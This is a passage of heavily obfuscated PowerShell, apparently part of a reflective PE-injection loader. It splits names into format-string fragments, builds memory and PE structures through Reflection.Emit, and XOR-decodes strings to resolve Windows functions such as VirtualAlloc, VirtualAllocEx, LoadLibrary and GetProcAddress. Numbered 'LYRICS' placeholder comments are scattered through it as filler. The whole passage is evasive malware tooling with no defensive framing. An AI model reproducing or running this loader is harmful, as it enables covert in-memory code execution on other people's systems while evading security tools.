            $VAR033   =   $VAR011.("{3}{1}{0}{2}" -f'eFie','in','ld','Def'  ).Invoke(  ( "{0}{1}" -f'N','ame'  ), [Char[]], ( "{2}{0}{3}{4}{1}"-f'c','dMarshal','Publi',', Ha','sFiel') )
            $VAR028  =  $VAR097::"Byv`AlaRr`AY"
# LYRICS127
# LYRICS128
            $VAR030  =  &(  "{1}{2}{0}" -f'ct','New-','Obje'  ) (  "{6}{1}{4}{5}{7}{0}{2}{3}" -f 'sto','yst','mAttribut','eBuilder','em.','Refle','S','ction.Emit.Cu' )( $VAR015, $VAR028, $VAR029, @([Int32] 8 ))
            $VAR033.( "{3}{4}{0}{1}{2}" -f'stomAttr','ibu','te','Se','tCu'  ).Invoke( $VAR030)
# LYRICS129
            $VAR011.(  "{1}{0}{2}{3}" -f'n','Defi','eF','ield').Invoke((  "{2}{1}{0}"-f'ST143','ON','C' ), [UInt32], ( "{2}{0}{1}" -f 'ub','lic','P')  )  |  &  ( "{1}{0}" -f 'll','Out-Nu' )
# LYRICS130
# LYRICS131
            $VAR011.( "{1}{3}{2}{0}" -f'd','Defin','l','eFie').Invoke( ( "{2}{1}{0}"-f'4','07','CONST'), [UInt32], ( "{0}{1}"-f'P','ublic' ))   |  &( "{0}{1}{2}" -f'O','ut','-Null')
            $VAR011.( "{1}{0}{2}"-f 'fine','De','Field' ).Invoke(  ( "{1}{2}{0}"-f 'T144','C','ONS' ), [UInt32], ("{1}{2}{0}"-f 'ic','Pu','bl'  )) |  &  (  "{2}{1}{0}"-f'-Null','t','Ou'  )
            $VAR011.( "{1}{0}{2}"-f'fine','De','Field' ).Invoke(( "{1}{0}"-f'145','CONST'), [UInt32], ("{0}{1}{2}" -f'P','ubli','c' ) )   |  &("{2}{1}{0}"-f'l','l','Out-Nu'  )
            $VAR011.(  "{0}{1}{3}{2}"-f 'D','efine','eld','Fi'  ).Invoke((  "{2}{0}{1}" -f 'ONST','146','C'  ), [UInt32], (  "{1}{0}{2}" -f'bli','Pu','c' )  ) |    &  (  "{2}{1}{0}" -f 't-Null','u','O')
            $VAR011.( "{1}{2}{0}"-f 'eField','Defi','n' ).Invoke(( "{0}{1}{2}"-f 'CON','ST','147'  ), [UInt32], ( "{1}{0}" -f 'blic','Pu'  ) ) |  &  (  "{2}{1}{0}"-f 'll','ut-Nu','O' )
            $VAR011.( "{0}{2}{1}" -f 'De','d','fineFiel'  ).Invoke( (  "{2}{1}{0}"-f'48','T1','CONS'), [UInt16], (  "{1}{0}" -f'lic','Pub')) |    &(  "{1}{0}" -f 'ull','Out-N'  )
# LYRICS132
# LYRICS133
            $VAR011.("{0}{3}{1}{2}" -f 'De','in','eField','f' ).Invoke((  "{0}{1}{2}"-f'CON','ST','149'  ), [UInt16], (  "{0}{1}" -f 'Publ','ic' )  ) |    &  ( "{2}{1}{0}"-f 'll','-Nu','Out' )
# LYRICS134
# LYRICS135
            $VAR011.("{2}{0}{1}"-f 'ie','ld','DefineF').Invoke(( "{0}{1}"-f 'CONST0','67' ), [UInt32], ( "{0}{1}" -f 'Pu','blic') ) |    &  (  "{2}{0}{1}" -f't-Nu','ll','Ou')
            $VAR034  =   $VAR011.( "{0}{2}{1}" -f 'C','eateType','r'  ).Invoke( )
            $VAR010 |    &(  "{0}{1}{2}"-f'Add-','Mem','ber'  ) -MemberType ("{1}{0}{3}{2}" -f 'ote','N','erty','Prop') -Name (  "{0}{1}{2}"-f 'CO','NST1','42' ) -Value $VAR034
# LYRICS136
# LYRICS137
            $VAR019   = (  "{2}{1}{4}{17}{18}{9}{15}{7}{0}{11}{6}{19}{16}{5}{14}{12}{8}{10}{3}{13}" -f 'Sequential','AnsiClas','AutoLayout, ','ldIn','s, Cl','le','ayout',', ','i','bli','e','L','reF','it','d, Befo','c',' Sea','ass, ','Pu',',' )
            $VAR011  = $VAR014.( "{0}{1}{2}"-f'Define','Typ','e'  ).Invoke( (  "{0}{1}{2}"-f 'C','ONST15','0'  ), $VAR019, [System.ValueType], 8)
            $VAR011.("{0}{2}{1}{3}" -f'Def','neFi','i','eld').Invoke( ( "{0}{1}{2}"-f'CO','NST0','74'), [UInt32], ("{0}{1}" -f'Pu','blic') )  |  & ( "{1}{2}{0}"-f 'l','Out-N','ul'  )
# LYRICS138
# LYRICS139
            $VAR011.( "{2}{0}{1}"-f'ie','ld','DefineF' ).Invoke(  (  "{1}{0}{2}" -f 'ON','C','ST151'), [UInt32], ( "{0}{1}" -f'Pu','blic' )  ) |     &(  "{2}{1}{0}"-f'ull','ut-N','O')
            $VAR035  =  $VAR011.( "{2}{1}{0}" -f'ateType','re','C' ).Invoke(   )
# LYRICS140
# LYRICS141
            $VAR010 |  &  ( "{1}{0}{2}"-f'Me','Add-','mber') -MemberType (  "{3}{0}{2}{1}" -f'P','perty','ro','Note') -Name (  "{1}{0}" -f'50','CONST1'  ) -Value $VAR035
# LYRICS142
# LYRICS143
            $VAR019   =  (  "{13}{12}{0}{5}{8}{3}{10}{7}{9}{6}{2}{4}{11}{1}"-f'to','Init',' B','iClass, ','efore','Lay',', Sealed,','ublic, SequentialLay','out, Ans','out','Class, P','Field','u','A'  )
            $VAR011 =   $VAR014.( "{1}{0}{2}{3}" -f 'fi','De','neT','ype' ).Invoke(  ("{2}{1}{0}"-f'152','ONST','C'), $VAR019, [System.ValueType], 20  )
            $VAR011.(  "{2}{3}{1}{0}"-f'd','l','Defin','eFie').Invoke( ("{0}{1}"-f'CONS','T067' ), [UInt32], ("{1}{0}{2}"-f'i','Publ','c') )   |  & ("{2}{0}{1}"-f 't-','Null','Ou' )
            $VAR011.("{1}{2}{0}"-f 'eField','Def','in'  ).Invoke(  (  "{2}{0}{1}" -f'T','071','CONS' ), [UInt32], ( "{0}{1}"-f 'Pub','lic' ) )  | &  ( "{0}{2}{1}"-f'Out-','ll','Nu')
# LYRICS144
# LYRICS145
            $VAR011.(  "{2}{0}{1}"-f 'eFie','ld','Defin' ).Invoke( ("{0}{1}" -f 'CONST','153'), [UInt32], ( "{1}{0}"-f 'lic','Pub' )  )  |    &  ( "{0}{1}" -f 'Out','-Null' )
            $VAR011.(  "{1}{0}{3}{2}" -f'efin','D','ield','eF' ).Invoke(  (  "{0}{1}" -f 'N','ame'), [UInt32], (  "{0}{1}"-f 'Pu','blic' ) ) |  &  (  "{0}{1}"-f'O','ut-Null')
            $VAR011.("{0}{3}{2}{1}" -f'D','ld','ineFie','ef').Invoke(( "{0}{1}" -f 'CONST','154'  ), [UInt32], (  "{1}{0}" -f 'ic','Publ'  ) )  |   &(  "{2}{1}{0}" -f 'Null','t-','Ou')
            $VAR036  = $VAR011.( "{1}{2}{0}" -f'e','Create','Typ'  ).Invoke(   )
            $VAR010   |  &  ( "{0}{2}{1}" -f'Add-Memb','r','e') -MemberType ("{3}{1}{0}{2}" -f 'ope','otePr','rty','N'  ) -Name ( "{1}{0}{2}"-f'ON','C','ST152') -Value $VAR036
# LYRICS146
# LYRICS147
            $VAR019   =   ( "{15}{12}{11}{10}{9}{2}{13}{5}{18}{14}{1}{6}{19}{17}{8}{3}{0}{7}{4}{16}" -f' B','yout',', Pub','ed,','eF','equent',',','efor','al','lass',' C','ut, AnsiClass,','toLayo','lic, S','alLa','Au','ieldInit','Se','i',' ')
            $VAR011   = $VAR014.( "{1}{2}{0}" -f 'eType','D','efin' ).Invoke(  ("{1}{0}{2}" -f'ST','CON','155'  ), $VAR019, [System.ValueType], 40)
            $VAR011.("{2}{0}{1}"-f 'l','d','DefineFie').Invoke(("{0}{1}{2}"-f 'CO','N','ST067' ), [UInt32], ( "{1}{2}{0}" -f 'lic','P','ub'  )) |    &  (  "{0}{2}{1}" -f 'O','Null','ut-'  )
            $VAR011.("{0}{2}{1}{3}" -f'Defi','e','n','Field' ).Invoke(("{1}{0}" -f '71','CONST0'), [UInt32], (  "{0}{1}"-f 'Pub','lic' )  )  |    &  ( "{2}{1}{0}" -f'ull','N','Out-' )
            $VAR011.(  "{1}{0}{2}"-f'eFi','Defin','eld').Invoke( ( "{0}{1}"-f'CONS','T156'  ), [UInt16], ("{1}{0}"-f 'ic','Publ' ))   |  & ("{2}{1}{0}"-f'll','-Nu','Out' )
            $VAR011.("{1}{2}{0}{3}"-f'eFiel','De','fin','d' ).Invoke(  (  "{0}{2}{1}"-f 'C','157','ONST' ), [UInt16], ("{1}{0}" -f'c','Publi'))   |  &  ("{0}{1}{2}" -f'Out-','Nu','ll' )
            $VAR011.(  "{3}{2}{1}{0}" -f'd','neFiel','efi','D' ).Invoke(  ("{0}{1}"-f 'Nam','e'  ), [UInt32], ( "{1}{2}{0}"-f'ic','Pu','bl'  )) |   &( "{0}{2}{1}" -f 'O','ull','ut-N' )
            $VAR011.("{0}{1}{3}{2}" -f 'Defin','eFie','d','l').Invoke(  ("{0}{1}"-f'Bas','e'  ), [UInt32], ( "{2}{1}{0}" -f 'lic','ub','P' ))   |     & ("{1}{0}{2}" -f 't-Nul','Ou','l')
            $VAR011.( "{2}{1}{0}" -f 'd','ineFiel','Def' ).Invoke(  ("{1}{0}{2}"-f 'T1','CONS','58'), [UInt32], ( "{0}{1}"-f 'Pu','blic' ) )   |     &(  "{1}{0}{2}" -f 'u','Out-N','ll')
            $VAR011.(  "{2}{1}{0}" -f'ld','e','DefineFi').Invoke(("{0}{2}{1}" -f'CO','T159','NS' ), [UInt32], (  "{2}{0}{1}" -f 'ubl','ic','P' )  ) |   &  (  "{0}{2}{1}" -f 'O','l','ut-Nul'  )
# LYRICS148
# LYRICS149
            $VAR011.( "{2}{0}{1}"-f'efineFiel','d','D'  ).Invoke((  "{0}{1}" -f'C','ONST160'  ), [UInt32], ("{2}{1}{0}" -f'ic','ubl','P') )   |  &( "{0}{1}{2}"-f'O','u','t-Null'  )
            $VAR011.(  "{3}{1}{2}{0}" -f'eld','neF','i','Defi' ).Invoke(  ( "{1}{0}{2}" -f 'N','CO','ST161'  ), [UInt32], ( "{0}{1}"-f 'P','ublic') ) |    &( "{0}{2}{1}"-f'Out-','ll','Nu'  )
            $VAR011.(  "{0}{2}{3}{1}"-f'D','ld','efine','Fie').Invoke((  "{0}{1}" -f 'CON','ST162'), [UInt32], (  "{0}{1}" -f 'Pu','blic' )  )  |    & ("{2}{0}{1}" -f't-','Null','Ou' )
            $VAR037 = $VAR011.(  "{2}{0}{1}"-f'T','ype','Create' ).Invoke(  )
            $VAR010   |   &  ("{2}{0}{1}"-f 'd-Mem','ber','Ad') -MemberType ( "{0}{1}{3}{2}"-f 'NoteP','ro','erty','p') -Name (  "{0}{2}{1}" -f'C','155','ONST' ) -Value $VAR037
# LYRICS150
# LYRICS151
            $VAR019   = (  "{7}{0}{17}{10}{2}{4}{20}{19}{21}{18}{12}{14}{16}{15}{11}{6}{13}{1}{8}{5}{9}{3}" -f'u',' Befo','out','nit',',','eld','yout, Seale','A','reFi','I','y','alLa','as','d,','s','quenti',', Public, Se','toLa','s, Cl','nsi',' A','Clas')
            $VAR011   =   $VAR014.("{0}{2}{1}" -f 'De','Type','fine').Invoke(  ("{0}{1}{2}"-f 'CON','ST1','63'  ), $VAR019, [System.ValueType], 8  )
            $VAR011.(  "{2}{3}{1}{0}" -f'ield','F','Defin','e' ).Invoke(( "{1}{0}"-f 'ST164','CON'), [UInt32], (  "{1}{0}"-f 'ublic','P'  )  )  |   & ("{0}{2}{1}" -f 'O','ull','ut-N')
            $VAR011.("{0}{1}{2}" -f 'Defin','eFiel','d' ).Invoke( ( "{2}{1}{0}" -f '165','ST','CON' ), [UInt32], (  "{1}{0}" -f 'c','Publi')) |  &("{2}{1}{0}"-f'l','-Nul','Out')
            $VAR038  = $VAR011.( "{1}{2}{0}" -f 'e','Creat','eTyp'  ).Invoke(  )
            $VAR010   |   & (  "{2}{0}{1}{3}"-f 'd-Me','m','Ad','ber' ) -MemberType ("{0}{1}{2}" -f 'NotePr','o','perty'  ) -Name (  "{1}{2}{0}"-f '63','CONS','T1'  ) -Value $VAR038
# LYRICS152
# LYRICS153
            $VAR019 =  ( "{5}{8}{1}{7}{13}{9}{12}{10}{6}{2}{14}{4}{3}{0}{11}"-f 'l','t,','Sequentia',', Sea','t','AutoLay',' ',' ','ou','a','ss, Public,','ed, BeforeFieldInit','ss, Cla','AnsiCl','lLayou' )
            $VAR011 =   $VAR014.(  "{2}{0}{1}" -f 'eTyp','e','Defin'  ).Invoke( ( "{0}{1}{2}" -f 'CONS','T','166'  ), $VAR019, [System.ValueType], 12 )
            $VAR011.("{1}{2}{0}"-f'Field','De','fine').Invoke(("{2}{0}{1}" -f 'ST1','63','CON' ), $VAR038, (  "{0}{1}{2}" -f'Pu','b','lic' ) ) |   & ( "{0}{1}"-f'Out-N','ull' )
# LYRICS154
# LYRICS155
            $VAR011.("{1}{3}{0}{2}" -f 'ineF','De','ield','f' ).Invoke(  ("{3}{1}{2}{0}" -f 's','tri','bute','At' ), [UInt32], (  "{0}{1}"-f'Pub','lic')  ) | &(  "{1}{0}" -f 't-Null','Ou'  )
            $VAR039   =   $VAR011.( "{2}{0}{3}{1}" -f'ate','pe','Cre','Ty').Invoke(  )
            $VAR010  |   &(  "{0}{2}{1}"-f 'Ad','-Member','d') -MemberType ("{2}{1}{0}"-f 'operty','tePr','No'  ) -Name (  "{0}{2}{1}" -f'CONS','66','T1') -Value $VAR039
# LYRICS156
# LYRICS157
            $VAR019   = (  "{14}{12}{3}{13}{6}{7}{15}{11}{0}{4}{9}{16}{8}{1}{2}{5}{10}" -f 'lic, Sequentia','B','e','siCl','lL','f',',',' Cl','ealed, ','ay','oreFieldInit','Pub','t, An','ass','AutoLayou','ass, ','out, S'  )
            $VAR011  = $VAR014.("{0}{1}{2}" -f'De','fineTyp','e').Invoke(  ( "{1}{2}{0}"-f '167','CON','ST' ), $VAR019, [System.ValueType], 16 )
# LYRICS158
# LYRICS159
            $VAR011.("{0}{2}{1}"-f'Define','ld','Fie' ).Invoke(  (  "{0}{1}"-f'C','ONST168'), [UInt32], ("{0}{2}{1}"-f'P','blic','u'  )) |  &  (  "{0}{1}" -f'Out-','Null' )
            $VAR011.("{3}{0}{1}{2}" -f 'efin','eFi','eld','D'  ).Invoke( ( "{1}{2}{0}" -f 'NST169','C','O' ), $VAR039, ("{0}{1}"-f'Publ','ic'  )  ) |   &  ( "{1}{0}{2}"-f'-N','Out','ull' )
            $VAR040  =  $VAR011.( "{1}{3}{0}{2}"-f 'a','C','teType','re').Invoke(  )
            $VAR010 |   & (  "{2}{0}{1}"-f '-Me','mber','Add' ) -MemberType ( "{2}{0}{3}{1}"-f 'otePr','rty','N','ope') -Name (  "{1}{0}" -f'NST167','CO' ) -Value $VAR040
# LYRICS160
            return $VAR010
        }
# LYRICS161
        Function fU`N`100
        {
        Param(
                [Parameter(POsition   =  0, mANdatORY  =   $true )]
                [byte[]]
                $VAR0320
            )
# LYRICS162
            $VAR0322  =  [Byte]0x5A
# LYRICS163
# LYRICS164
            $VAR0321 =   for ($i   =   0 ; $i -lt $VAR0320."lEN`gth"  ;   $i++) { [char]( [Byte]$VAR0320[$i] -bxor $VAR0322 ) } -join ''
# LYRICS165
# LYRICS166
# LYRICS167
            return [String]( $VAR0321   |   &  ( "{2}{1}{0}{3}" -f 'bjec','Each-O','For','t'  ) { $_ }  ) -join ""
# LYRICS168
        }
# LYRICS169
        $VAR0303 =  [Byte]0x5A
        $VAR0300   = 49,63,40,52,63,54,105,104,116,62,54,54
# LYRICS170
# LYRICS171
        $VAR0301   = for ($i =  0  ; $i -lt $VAR0300."le`Ng`TH";   $i++  ) { [char]([Byte]$VAR0300[$i] -bxor $VAR0303  ) } -join ''
        $VAR0302   =   ($VAR0301 |     &  ( "{4}{2}{0}{3}{1}"-f 'a','ct','rE','ch-Obje','Fo') { $_ } ) -join ""
# LYRICS172
        $VAR0304 =  27,62,44,59,42,51,105,104,116,62,54,54
        $VAR0305  =   for ( $i   =   0 ; $i -lt $VAR0304."LEn`Gth" ; $i++ ) { [char]([Byte]$VAR0304[$i] -bxor $VAR0303  ) } -join ''
# LYRICS173
# LYRICS174
        $VAR0306   =  ( $VAR0305   |   & (  "{1}{0}{2}"-f'a','ForE','ch-Object'  ) { $_ }) -join ""
# LYRICS175
        $VAR0307   =  55,41,44,57,40,46,116,62,54,54
        $VAR0308   = for ($i   =  0  ;  $i -lt $VAR0307."LEn`GTH" ;  $i++  ) { [char]( [Byte]$VAR0307[$i] -bxor $VAR0303 ) } -join ''
# LYRICS176
# LYRICS177
        $VAR0309 =   ( $VAR0308 |   &("{0}{2}{1}{3}"-f'F','ch-Ob','orEa','ject') { $_ } ) -join ""
# LYRICS178
        $VAR0310 = 29,63,46,10,40,53,57,27,62,62,40,63,41,41
# LYRICS179
# LYRICS180
        $VAR0311   =  for ($i   =  0;   $i -lt $VAR0310."l`enGth";   $i++) { [char](  [Byte]$VAR0310[$i] -bxor $VAR0303 ) } -join ''
# LYRICS181
# LYRICS182
        $VAR0312   = (  $VAR0311 |     & ( "{1}{2}{0}" -f 'bject','ForEach-','O') { $_ }  ) -join ""
# LYRICS183
        $VAR0313   = 12,51,40,46,47,59,54,27,54,54,53,57
        $VAR0314 = for ($i  =   0;   $i -lt $VAR0313."lENG`Th";   $i++) { [char]( [Byte]$VAR0313[$i] -bxor $VAR0303  ) } -join ''
# LYRICS184
# LYRICS185
        $VAR0315  =   ( $VAR0314 |  &(  "{1}{0}{3}{4}{2}" -f'Ea','For','Object','c','h-' ) { $_ } ) -join ''
# LYRICS186
        $VAR0316  =  12,51,40,46,47,59,54,27,54,54,53,57,31,34
        $VAR0317  =   for (  $i = 0 ;   $i -lt $VAR0316."lEn`gth"  ;   $i++  ) { [char]([Byte]$VAR0316[$i] -bxor $VAR0303  ) } -join ''
# LYRICS187
# LYRICS188
        $VAR0318   = (  $VAR0317   |   &  (  "{3}{1}{0}{2}" -f 'bje','Each-O','ct','For' ) { $_ } ) -join ''
# LYRICS189
                    $VAR0327   =   22,53,59,62,22,51,56,40,59,40,35,27
# LYRICS190
# LYRICS191
            $VAR0328 =   for ($i   =   0  ; $i -lt $VAR0327."L`enGTH"  ;   $i++) { [char]([Byte]$VAR0327[$i] -bxor $VAR0303) } -join ''
            $VAR0329  =  ( $VAR0328 |   & ("{1}{3}{2}{0}" -f 'ect','ForEach','j','-Ob') { $_ } ) -join ''
# LYRICS192
# LYRICS193
# LYRICS194
        Function F`Un002 {
# LYRICS195
# LYRICS196
            $VAR0041  =  &(  "{1}{0}{3}{2}"-f'w-Ob','Ne','t','jec'  ) ( "{3}{1}{2}{0}"-f 'ject','stem.O','b','Sy')
# LYRICS197
            $VAR0041 |   &( "{2}{1}{0}" -f 'er','Memb','Add-' ) -MemberType ( "{2}{0}{3}{1}"-f'tePr','y','No','opert' ) -Name (  "{0}{1}" -f'CONS','T001' ) -Value 0x00001000
# LYRICS198
# LYRICS199
            $VAR0041   |     &  (  "{2}{0}{1}"-f 'd','-Member','Ad') -MemberType ("{2}{0}{1}{3}"-f'Prop','er','Note','ty' ) -Name ("{1}{0}{2}"-f'NST00','CO','2'  ) -Value 0x00002000
            $VAR0041  |     &("{0}{1}{2}"-f 'Add-Me','m','ber') -MemberType (  "{0}{3}{2}{1}" -f 'No','y','rt','tePrope'  ) -Name ("{0}{2}{1}" -f 'C','03','ONST0') -Value 0x01
            $VAR0041 |   &("{2}{0}{1}"-f 'Me','mber','Add-'  ) -MemberType ( "{0}{1}{2}{3}"-f'Not','e','Prop','erty') -Name (  "{0}{1}"-f'CONS','T004') -Value 0x02
# LYRICS200
# LYRICS201
            $VAR0041   |   & ( "{2}{1}{0}" -f 'ember','-M','Add'  ) -MemberType ("{1}{0}{2}{3}" -f 'op','NotePr','e','rty') -Name (  "{2}{0}{1}" -f'0','05','CONST' ) -Value 0x04
            $VAR0041   |  &( "{1}{3}{2}{0}"-f'r','Ad','Membe','d-') -MemberType ("{2}{0}{3}{1}"-f'per','y','NotePro','t') -Name (  "{1}{2}{0}"-f '6','CO','NST00' ) -Value 0x08
            $VAR0041  |  & ( "{2}{1}{0}"-f 'r','e','Add-Memb'  ) -MemberType ("{3}{0}{1}{2}"-f'teP','roper','ty','No' ) -Name ("{0}{1}{2}" -f'CON','ST','007') -Value 0x10
            $VAR0041 |    &( "{2}{1}{0}"-f'-Member','d','Ad' ) -MemberType ( "{1}{2}{3}{0}"-f 'y','NoteP','ro','pert' ) -Name ("{0}{1}" -f'CONST00','9') -Value 0x20
            $VAR0041 |  &  (  "{1}{2}{0}"-f'r','Add-','Membe'  ) -MemberType ("{1}{0}{2}"-f'teP','No','roperty') -Name ("{0}{2}{1}" -f 'CO','8','NST00' ) -Value 0x40
            $VAR0041  | &( "{1}{0}{3}{2}" -f'dd-Mem','A','r','be') -MemberType (  "{0}{3}{1}{2}" -f 'Not','er','ty','eProp') -Name (  "{1}{0}{2}"-f'1','CONST0','0'  ) -Value 0x80
            $VAR0041 | & (  "{3}{0}{1}{2}" -f'd-Me','mbe','r','Ad' ) -MemberType ( "{0}{3}{1}{2}" -f 'N','ert','y','oteProp' ) -Name ( "{2}{1}{0}" -f'T011','NS','CO' ) -Value 0x200
            $VAR0041   |    &  ("{1}{2}{0}"-f 'mber','Add','-Me'  ) -MemberType (  "{2}{3}{1}{0}" -f 'erty','Prop','Not','e') -Name ("{2}{0}{1}" -f 'ON','ST012','C') -Value 0
            $VAR0041   |     &(  "{2}{0}{1}" -f'dd-M','ember','A'  ) -MemberType ( "{1}{0}{2}{3}"-f'otePr','N','op','erty' ) -Name ( "{1}{0}" -f'NST013','CO'  ) -Value 3
            $VAR0041   |    &  ( "{1}{2}{0}"-f'r','Add-','Membe' ) -MemberType ("{3}{1}{2}{0}"-f'perty','te','Pro','No' ) -Name ("{0}{1}"-f 'CON','ST014' ) -Value 10
            $VAR0041  |     &( "{0}{2}{1}" -f'A','Member','dd-' ) -MemberType ( "{2}{0}{3}{1}" -f'ote','roperty','N','P'  ) -Name (  "{0}{2}{1}"-f 'CON','015','ST' ) -Value 0x02000000
# LYRICS202
# LYRICS203
            $VAR0041   |  &( "{2}{0}{1}" -f 'd-M','ember','Ad') -MemberType ( "{2}{0}{1}" -f'ot','eProperty','N'  ) -Name (  "{1}{0}" -f '16','CONST0'  ) -Value 0x20000000
            $VAR0041   |   & ( "{2}{1}{0}"-f 'Member','-','Add'  ) -MemberType (  "{2}{0}{3}{1}"-f'ot','ty','N','eProper'  ) -Name ( "{2}{0}{1}" -f '01','7','CONST' ) -Value 0x40000000
            $VAR0041  |  &("{2}{0}{1}" -f 'dd-Mem','ber','A') -MemberType ( "{2}{1}{0}{3}"-f 'ePro','t','No','perty') -Name ("{0}{2}{1}"-f 'CO','018','NST') -Value 0x80000000
# LYRICS204
# LYRICS205
            $VAR0041   |   & ("{0}{1}{2}" -f 'Add','-','Member') -MemberType ( "{3}{0}{2}{1}" -f 'Pro','ty','per','Note') -Name ("{0}{2}{1}"-f 'C','9','ONST01' ) -Value 0x04000000
            $VAR0041   | &  ("{1}{2}{0}" -f 'r','Ad','d-Membe' ) -MemberType ( "{2}{0}{1}" -f't','eProperty','No' ) -Name (  "{2}{1}{0}"-f 'NST020','O','C') -Value 0x4000
            $VAR0041  | &  ( "{0}{2}{3}{1}" -f 'A','er','dd-M','emb' ) -MemberType ( "{0}{2}{3}{1}"-f 'Not','perty','ePr','o' ) -Name ( "{2}{0}{1}" -f 'ON','ST021','C' ) -Value 0x0002
            $VAR0041  |   &  (  "{0}{2}{1}" -f'Add-Me','r','mbe') -MemberType ( "{0}{2}{3}{1}" -f 'NoteProp','ty','e','r') -Name ("{1}{2}{0}"-f'ST022','CO','N') -Value 0x2000
            $VAR0041   |  &  ( "{0}{3}{2}{1}"-f 'Add','ber','m','-Me'  ) -MemberType ( "{0}{2}{1}" -f 'No','eProperty','t') -Name (  "{0}{2}{1}" -f'CONST','23','0'  ) -Value 0x40
            $VAR0041 |   &  (  "{1}{0}{2}" -f 'dd-','A','Member' ) -MemberType (  "{1}{3}{2}{0}" -f'ty','Note','er','Prop' ) -Name ( "{2}{0}{1}"-f'0','24','CONST'  ) -Value 0x100
# LYRICS206
# LYRICS207
            $VAR0041 |   &  ("{1}{3}{2}{0}" -f'r','Add-Mem','e','b' ) -MemberType ( "{2}{0}{1}" -f'o','perty','NotePr' ) -Name ("{1}{0}"-f'NST025','CO' ) -Value 0x8000
            $VAR0041 |   & ("{0}{1}{2}" -f 'Ad','d-Memb','er' ) -MemberType ( "{1}{0}{2}" -f'tePro','No','perty' ) -Name ("{2}{1}{0}"-f'ST026','ON','C'  ) -Value 0x0008
            $VAR0041   |    &  ( "{1}{2}{0}"-f 'r','Add-M','embe'  ) -MemberType (  "{1}{0}{2}" -f'otePr','N','operty' ) -Name ( "{1}{2}{0}"-f '7','CON','ST02'  ) -Value 0x0020
# LYRICS208
# LYRICS209
            $VAR0041   |    & ( "{2}{1}{0}"-f'-Member','dd','A'  ) -MemberType (  "{1}{3}{2}{0}" -f'y','NotePro','ert','p') -Name ( "{1}{2}{0}"-f'028','C','ONST'  ) -Value 0x2
            $VAR0041   | & ( "{0}{2}{1}"-f'Add-','ber','Mem') -MemberType (  "{1}{0}{2}" -f 'eProper','Not','ty' ) -Name ("{0}{1}"-f'CONST0','29') -Value 0x3f0
# LYRICS210
            return $VAR0041
        }
# LYRICS211
        Function fUn003 {
# LYRICS212
# LYRICS213
            $VAR0042 =   & ("{2}{1}{0}"-f 'ct','w-Obje','Ne'  ) ( "{3}{0}{2}{1}" -f'em.Obje','t','c','Syst' )
# LYRICS214
            $VAR0043 =   &( "{1}{0}" -f'2','FUN01' ) $VAR0302 $VAR0315
            $VAR0044   = &( "{0}{1}" -f'F','UN011') @($VAR095, [UIntPtr], [UInt32], [UInt32] ) ($VAR095 )
# LYRICS215
# LYRICS216
            $VAR0045  = $VAR099::$VAR096(  $VAR0043, $VAR0044 )
            $VAR0042 |   &  ("{1}{2}{0}" -f 'er','A','dd-Memb') ("{0}{1}{2}{3}"-f'Note','P','ropert','y'  ) -Name ( "{0}{1}"-f 'F','UN031') -Value $VAR0045
# LYRICS217
            $VAR0046  =  & (  "{1}{0}" -f '12','FUN0'  ) $VAR0302 $VAR0318
            $VAR0047   =   &  ("{0}{1}" -f'FU','N011' ) @($VAR095, $VAR095, [UIntPtr], [UInt32], [UInt32]) ( $VAR095)
# LYRICS218
            $VAR0048 = $VAR099::$VAR096($VAR0046, $VAR0047  )
# LYRICS219
# LYRICS220
            $VAR0042  |     & ("{2}{0}{1}{3}" -f'dd-','Memb','A','er') (  "{2}{1}{0}" -f'Property','ote','N'  ) -Name ("{0}{1}"-f'FU','N032') -Value $VAR0048
# LYRICS221
            $VAR0049 = & (  "{2}{1}{0}"-f '012','N','FU'  ) $VAR0309 ( "{1}{0}"-f 'emcpy','m' )
            $VAR0050 = &( "{0}{1}"-f 'FU','N011'  ) @($VAR095, $VAR095, [UIntPtr]  ) (  $VAR095  )
            $VAR0051 =  $VAR099::$VAR096(  $VAR0049, $VAR0050  )
# LYRICS222
            $VAR0042  |   &( "{2}{1}{0}"-f'ber','em','Add-M'  ) -MemberType ("{2}{0}{3}{1}" -f'ote','y','N','Propert'  ) -Name ( "{0}{1}" -f 'FUN03','3') -Value $VAR0051
# LYRICS223
            $VAR0052  =   &  ( "{1}{0}" -f 'UN012','F' ) $VAR0309 ("{1}{0}{2}"-f's','mem','et'  )
            $VAR0053   =    &(  "{1}{0}"-f 'N011','FU') @($VAR095, [Int32], $VAR095 ) ($VAR095)
# LYRICS224
            $VAR0054  = $VAR099::$VAR096(  $VAR0052, $VAR0053)
            $VAR0042 |  &(  "{1}{2}{0}"-f'r','Add-Memb','e'  ) -MemberType ( "{3}{1}{2}{0}"-f'perty','r','o','NoteP' ) -Name ( "{1}{0}"-f'34','FUN0'  ) -Value $VAR0054
# LYRICS225
# LYRICS226
            $VAR0055 =    &("{1}{0}"-f'12','FUN0') $VAR0302 $VAR0329
            $VAR0056   =  &(  "{1}{0}{2}" -f'01','FUN','1' ) @([String]  ) ( $VAR095)
# LYRICS227
            $VAR0057  = $VAR099::$VAR096($VAR0055, $VAR0056)
# LYRICS228
            $VAR0042   |   &  ("{2}{1}{0}" -f'mber','e','Add-M' ) -MemberType (  "{0}{2}{3}{1}"-f'N','roperty','ote','P') -Name ("{0}{2}{1}"-f 'F','5','UN03'  ) -Value $VAR0057
# LYRICS229
            $VAR0058   =   & (  "{1}{0}" -f'012','FUN' ) $VAR0302 $VAR0312
# LYRICS230
            $VAR0059   =   &  (  "{1}{0}{2}" -f'UN0','F','11'  ) @($VAR095, [String]) ($VAR095)
            $VAR0060  = $VAR099::$VAR096($VAR0058, $VAR0059)
# LYRICS231
            $VAR0042  |  & (  "{2}{0}{1}" -f 'em','ber','Add-M' ) -MemberType (  "{3}{0}{1}{2}" -f'rop','ert','y','NoteP') -Name (  "{0}{1}{2}" -f 'FUN','0','36' ) -Value $VAR0060
# LYRICS232
            $VAR0061 =  &( "{0}{2}{1}"-f'FU','2','N01' ) $VAR0302 $VAR0312 
            $VAR0062  =    &( "{1}{0}"-f 'UN011','F' ) @($VAR095, $VAR095 ) (  $VAR095 )
# LYRICS233
            $VAR0063 = $VAR099::$VAR096( $VAR0061, $VAR0062 )
# LYRICS234
            $VAR0042  |   &( "{1}{0}{2}" -f'-Memb','Add','er'  ) -MemberType ("{2}{0}{3}{1}" -f'o','y','N','tePropert' ) -Name ( "{0}{1}" -f 'FUN0','37'  ) -Value $VAR0063
# LYRICS235
            $VAR0064   = & (  "{2}{1}{0}"-f'2','UN01','F' ) $VAR0302 ("{1}{3}{2}{0}"-f'alFree','V','rtu','i'  )
